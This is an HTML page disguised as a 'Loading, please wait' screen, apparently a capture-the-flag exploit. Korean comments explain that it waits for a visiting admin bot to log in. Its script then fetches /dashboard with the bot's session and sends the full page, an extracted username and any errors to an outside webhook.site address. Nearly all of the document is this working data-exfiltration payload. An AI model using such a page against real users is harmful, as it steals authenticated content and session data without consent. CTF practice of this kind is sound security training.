<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Processing...</title>
</head>
<body>
    <h1>Loading, please wait...</h1>
    <p>Your request is being processed.</p>
    
    <script>
    // 봇이 로그인할 때까지 대기 (7초)
    // 봇 동작: 우리 URL 방문(5초) → 등록/로그인(~2초) → admin stuff
    setTimeout(async function() {
        try {
            // 봇의 세션으로 dashboard 가져오기
            const response = await fetch('/dashboard');
            const htmlContent = await response.text();
            
            // FLAG는 "Welcome, ctf{...}!" 형식으로 HTML에 포함됨
            // 전체 HTML을 webhook으로 전송
            await fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316?flag=' + encodeURIComponent(htmlContent));
            
            // 추가로 username 추출 시도
            const match = htmlContent.match(/Welcome,\s*([^!]+)!/);
            if (match) {
                await fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316?extracted=' + encodeURIComponent(match[1]));
            }
        } catch (error) {
            // 에러 발생 시 webhook으로 전송
            await fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316?error=' + encodeURIComponent(error.toString()));
        }
    }, 7000);
    </script>
</body>
</html>
